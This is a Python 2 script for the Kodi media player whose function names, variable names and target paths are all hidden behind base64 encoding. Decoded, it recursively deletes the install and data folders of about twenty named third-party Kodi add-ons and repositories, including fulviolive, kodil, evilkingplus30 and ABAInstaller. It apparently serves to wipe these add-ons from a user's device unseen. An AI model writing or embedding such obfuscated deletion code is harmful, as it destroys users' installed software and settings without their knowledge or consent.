import os, xbmc, shutil, base64

def ZGVsZXRl():
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5mdWx2aW9saXZl")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3JlcG9zaXRvcnkuZnVsdmlvbGl2ZQ==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uZnVsdmlvbGl2ZQ==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3JlcG9zaXRvcnkua29kaWw=")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9yZXBvc2l0b3J5LmtvZGls")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5EaWFib2xpazQ0MQ==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uRGlhYm9saWs0NDE=")))	
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5BbmdlbG9hZGRvbg==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5ldmlsa2luZ3BsdXMzMA==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5ldmlsc3BvcnQ=")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5Lb2RpTW9k")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5NZW4gb2YgdGhlIEJvc3M=")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5QbGFuZXRpcHR2")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5SZWRGaXJl")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5TYWx2YVplYnVs")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5TdGVmYW5v")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3JlcG9zaXRvcnkuYW5nZWxv")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3JlcG9zaXRvcnkuZXZpbGtpbmdyZXBvc2l0b3J5")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3JlcG9zaXRvcnkuc3RlZmFub3JlcG9zaXRvcnk=")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9yZXBvc2l0b3J5LmV2aWxraW5ncmVwb3NpdG9yeQ==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uQW5nZWxvYWRkb24=")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uZXZpbGtpbmdwbHVzMzA=")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uZXZpbHNwb3J0")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uS29kaU1vZA==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uTWVuIG9mIHRoZSBCb3Nz")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uUGxhbmV0aXB0dg==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uUmVkRmlyZQ==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uU2FsdmFaZWJ1bA==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uU3RlZmFubw==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9yZXBvc2l0b3J5LmFuZ2Vsbw==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9yZXBvc2l0b3J5LmV2aWxraW5ncmVwb3NpdG9yeQ==")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9yZXBvc2l0b3J5LnN0ZWZhbm9yZXBvc2l0b3J5")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5BQkFJbnN0YWxsZXI=")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9wbHVnaW4udmlkZW8uQUJBSW5zdGFsbGVy")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL3Byb2ZpbGUvYWRkb25fZGF0YS9yZXBvc2l0b3J5LmFuZHJvaWRhYmEuY29t")))
    ZWxpbWluYXR1dHRv(xbmc.translatePath(base64.urlsafe_b64decode("c3BlY2lhbDovL2hvbWUvYWRkb25zL3JlcG9zaXRvcnkuYW5kcm9pZGFiYS5jb20=")))
	
def ZWxpbWluYXR1dHRv(Y2FydGVsbGE):
    print(Y2FydGVsbGE)
    if os.path.isdir(Y2FydGVsbGE):
        try: shutil.rmtree(Y2FydGVsbGE, ignore_errors = False, onerror = None)
        except:
            print "Errore ++++++++"
            raise
    else:
        print "ok!"
